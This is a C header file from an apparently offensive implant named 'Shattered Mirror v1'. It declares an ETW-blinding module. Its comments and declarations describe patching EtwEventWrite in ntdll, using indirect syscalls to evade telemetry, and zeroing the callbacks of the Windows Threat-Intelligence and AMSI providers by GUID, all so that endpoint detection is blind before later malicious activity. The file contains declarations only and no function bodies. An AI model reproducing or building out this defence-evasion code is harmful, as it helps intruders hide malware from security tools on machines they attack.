#pragma once
/*=============================================================================
 * Shattered Mirror v1 — ETW Blinding Module
 *
 * 2026 Research Finding: EDRs rely heavily on ETW Threat Intelligence
 * (EtwTi) for behavioral detection. We blind it by:
 *   1. Patching EtwEventWrite in ntdll to ret early (classic)
 *   2. Using indirect syscalls for the patching itself (meta-evasion)
 *   3. Optionally blinding specific ETW providers by GUID
 *
 * This runs BEFORE any other Atom activity to ensure EDR telemetry
 * is dead before we touch anything suspicious.
 *===========================================================================*/

#ifndef SMIRROR_ETW_BLIND_H
#define SMIRROR_ETW_BLIND_H

#include "common.h"

/*---------------------------------------------------------------------------
 *  Blind ETW completely — patches EtwEventWrite to return immediately.
 *  Uses indirect syscalls for NtProtectVirtualMemory to change page
 *  permissions, so the patching itself doesn't trigger telemetry.
 *
 *  Returns TRUE on success.
 *-------------------------------------------------------------------------*/
BOOL BlindETW(PSYSCALL_TABLE pSyscallTable);

/*---------------------------------------------------------------------------
 *  Blind a specific ETW provider by GUID.
 *  Walks the provider registration list and zeroes the enable callback.
 *  More surgical than full ETW blinding — less detectable.
 *-------------------------------------------------------------------------*/
BOOL BlindETWProvider(PSYSCALL_TABLE pSyscallTable, const GUID* pProviderGuid);

/*---------------------------------------------------------------------------
 *  Restore ETW (for cleanup — optional, used before self-destruct)
 *-------------------------------------------------------------------------*/
BOOL RestoreETW(void);

/*---------------------------------------------------------------------------
 *  Known provider GUIDs to blind
 *-------------------------------------------------------------------------*/
/* Microsoft-Windows-Threat-Intelligence */
static const GUID GUID_ETW_THREAT_INTEL = 
    { 0xF4E1897A, 0xBB5D, 0x5A14, { 0x87, 0x64, 0xDA, 0x96, 0x20, 0xC0, 0x82, 0x54 } };

/* Microsoft-Antimalware-Scan-Interface */
static const GUID GUID_ETW_AMSI =
    { 0x2A576B87, 0x09A7, 0x520E, { 0xC2, 0x1A, 0x47, 0x40, 0xF0, 0x4E, 0x67, 0xA0 } };

#endif /* SMIRROR_ETW_BLIND_H */
